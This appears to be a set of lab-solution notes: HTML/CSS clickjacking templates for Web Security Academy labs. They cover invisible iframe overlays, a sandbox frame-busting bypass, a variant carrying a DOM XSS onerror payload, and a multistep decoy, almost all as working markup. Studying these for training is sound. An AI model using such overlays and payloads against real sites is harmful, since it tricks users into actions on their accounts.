# Clickjacking

```html
Basic with CSRF

<style>
    iframe {
        position:relative;
        width:$width_value; // change, try 500
        height: $height_value; // change, try 700
        opacity: $opacity; // start with 0.1, then take to 0.0001 or less
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value; // change, try 300
        left:$side_value; // change, try 60
        z-index: 1;
    }
    </style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>

Basic with form filled

<style>
    iframe {
        position:relative;
        width:$width_value; // change, try 500
        height: $height_value; // change, try 700
        opacity: $opacity; // start with 0.1, then take to 0.0001 or less
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value; // change, try 300
        left:$side_value; // change, try 60
        z-index: 1;
    }
    </style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=asdf@asdf.asdf"></iframe>

Frame busting, the sandbox "allow-forms" breaks out because "allow-top-navigation" is not used by website

<style>
    iframe {
        position:relative;
        width:$width_value; // change, try 500
        height: $height_value; // change, try 700
        opacity: $opacity; // start with 0.1, then take to 0.0001 or less
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value; // change, try 300
        left:$side_value; // change, try 60
        z-index: 1;
    }
    </style>
<div>Test me</div>
<iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=asdf@asdf.asdf"></iframe>

Clickjacking with DOM XSS

<style>
    iframe {
        position:relative;
        width: 800; 
        height: 1000; 
        opacity: 0.000001; 
        z-index: 2;
    }
    div {
        position:absolute;
        top: 800; 
        left: 60; 
        z-index: 1;
    }
    </style>
<div>Click me</div> // Needed to say click me not test me
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=asdf@asdf.asdf&subject=test&message=test"></iframe>

    Multistep Clickjacking

<style>
    iframe {
        position:relative;
        width: 500; 
        height: 700; 
        opacity: 0.1; 
        z-index: 2;
    }

    .div1, .div2 {
        position:absolute;
        top: 500; 
        left: 60; 
        z-index: 1;
    }

    .div2 {
        top: 300; 
        left: 210; 
    }
    </style>
<div class="div1">Click me first</div> 
<div class="div2">Click me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
